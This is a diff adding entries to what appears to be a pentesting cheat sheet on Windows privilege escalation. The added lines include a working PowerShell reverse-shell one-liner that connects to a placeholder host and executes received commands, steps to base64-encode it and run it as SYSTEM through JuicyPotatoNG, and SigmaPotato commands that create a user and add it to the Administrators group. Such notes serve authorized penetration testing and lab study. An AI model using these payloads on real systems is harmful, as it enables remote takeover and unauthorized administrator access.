@@ -8357,6 +8357,7 @@ Get-ADPrincipalGroupMembership username | select
 gci -force //powershell ls -al
 route print
 netstat -ano
+Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
 ```
 ###### Create windows user
 
@@ -11126,6 +11127,40 @@ $RESULT | ogv
 
 ```c
 .\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c whoami"
+```
+
+Take Invoke-PowerShellTcpOneLine.ps1
+
+```c
+$client = New-Object System.Net.Sockets.TCPClient('LOCAL_IP',LOCAL_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+Convert to powershell base64
+
+```c
+cat rev.ps1 | iconv -t UTF-16LE | base64 -w 0
+```
+
+Crear un archivo run.bat
+
+```c
+powershell -enc PAYLOAD
+```
+
+Run the run.bat with JuicyPotatoNG
+
+```c
+.\jp.exe -t * -p C:\PATH_TO_BAT
+```
+
+Listen on a port
+
+
+#### SigmaPotato
+
+```c
+.\SigmaPotato "net user dave4 lab /add"
+.\SigmaPotato "net localgroup Administrators dave4 /add"
 ```
 
 #### MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE
